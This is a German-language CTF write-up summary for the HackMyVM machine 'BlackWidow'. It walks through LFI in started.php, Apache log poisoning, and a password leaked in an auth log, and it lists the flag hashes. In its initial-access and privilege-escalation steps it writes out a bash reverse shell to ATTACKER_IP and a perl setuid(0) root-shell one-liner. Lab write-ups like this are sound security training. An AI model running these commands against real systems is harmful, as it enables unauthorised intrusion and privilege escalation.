# BlackWidow - HackMyVM Writeup

![BlackWidow VM Icon](BlackWidow.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "BlackWidow" (Schwierigkeitsgrad: Hard), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** BlackWidow
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Hard
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=BlackWidow](https://hackmyvm.eu/machines/machine.php?vm=BlackWidow)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 21. Mai 2024 *(Platzhalter - Bitte anpassen)*
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/BlackWidow_HackMyVM_Hard/](https://alientec1908.github.io/BlackWidow_HackMyVM_Hard/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die BlackWidow-Maschine umfasste die folgenden Schritte:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.140` unter dem Hostnamen `blackwidow`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte mehrere offene Ports, darunter SSH (22), HTTP (80, Apache), RPC/NFS (111, 2049, etc.) und einen Squid HTTP-Proxy (3128).
2.  **Web Enumeration:**
    *   `gobuster` und `wfuzz` wurden zur Enumeration des Webservers auf Port 80 eingesetzt.
    *   Die Datei `/company/started.php` wurde als interessant identifiziert.
    *   `wfuzz` fand einen LFI-anfälligen Parameter `file` in `started.php`.
    *   Über die LFI-Schwachstelle wurde `/etc/passwd` ausgelesen, was den Benutzer `viper` offenbarte.
    *   Apache-Logdateien wurden als potenzielles Ziel für Log Poisoning identifiziert.
3.  **Initial Access (via Log Poisoning & LFI):**
    *   Mittels `curl` wurde PHP-Code (``) in den User-Agent einer Anfrage an den Webserver injiziert, um diesen in die Apache `access.log`-Datei zu schreiben.
    *   Die `access.log`-Datei wurde über die LFI-Schwachstelle in `started.php` eingebunden, und der `cmd`-Parameter wurde verwendet, um Befehle auszuführen (`...access.log&cmd=id`). Dies bestätigte RCE als `www-data`.
    *   Eine Reverse Shell wurde über die LFI/Log-Poisoning-Kombination initiiert (`...access.log&cmd=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'`), was zu einer Shell als `www-data` führte.
4.  **Privilege Escalation (www-data zu viper):**
    *   Als `www-data` wurde die Datei `/var/backups/auth.log` untersucht.
    *   In den Logs wurde ein fehlgeschlagener SSH-Login-Versuch für einen "invalid user" namens `?V1p3r2020!?` auf Port 7090 gefunden.
    *   `V1p3r2020!` wurde als Passwort für den Benutzer `viper` interpretiert.
    *   Erfolgreicher SSH-Login als `viper` mit dem Passwort `V1p3r2020!`.
    *   Die User-Flag (`/home/viper/local.txt`) wurde gelesen.
5.  **Privilege Escalation (viper zu root):**
    *   `linpeas.sh` wurde auf dem Ziel ausgeführt und identifizierte die Datei `/home/viper/backup_site/assets/vendor/weapon/arsenic` als schreibbar für `viper` und mit der Capability `cap_setuid+ep` versehen.
    *   Das `arsenic`-Binary (vermutlich ein Perl-Interpreter oder ein Wrapper) wurde mit einem Perl-Payload ausgeführt, der `POSIX::setuid(0)` aufrief und dann `/bin/bash` startete: `/home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`.
    *   Dies führte zu einer Root-Shell.
6.  **Flags:**
    *   Die User-Flag wurde als `viper` gelesen.
    *   Die Root-Flag (`/root/root.txt`) wurde als `root` gelesen.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `grep`
*   `gobuster`
*   `wfuzz`
*   `curl`
*   `awk`
*   `tr`
*   `php` (implizit)
*   `nc` (netcat)
*   `bash`
*   `script`
*   `cat`
*   `ssh`
*   `linpeas.sh`
*   `perl` (implizit)
*   `id`
*   `pwd`

## Identifizierte Schwachstellen (Zusammenfassung)

*   **Local File Inclusion (LFI):** Der `file`-Parameter in `/company/started.php` war anfällig für LFI.
*   **Apache Log Poisoning:** In Kombination mit LFI ermöglichte das Schreiben von PHP-Code in die Apache `access.log` (via User-Agent) Remote Code Execution.
*   **Preisgabe von Passwort-Hinweisen in Logs:** Ein fehlgeschlagener Login-Versuch in `/var/backups/auth.log` enthielt das Passwort für den Benutzer `viper` im Benutzernamenfeld.
*   **Unsichere Linux Capabilities:** Die Datei `/home/viper/backup_site/assets/vendor/weapon/arsenic` hatte die `cap_setuid+ep`-Capability gesetzt und war für den Benutzer `viper` schreibbar, was eine direkte Privilegieneskalation zu Root ermöglichte.

## Flags

*   **User Flag (`/home/viper/local.txt`):** `d930fe79919376e6d08972dae222526b`
*   **Root Flag (`/root/root.txt`):** `0780eb289a44ba17ea499ffa6322b335`

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
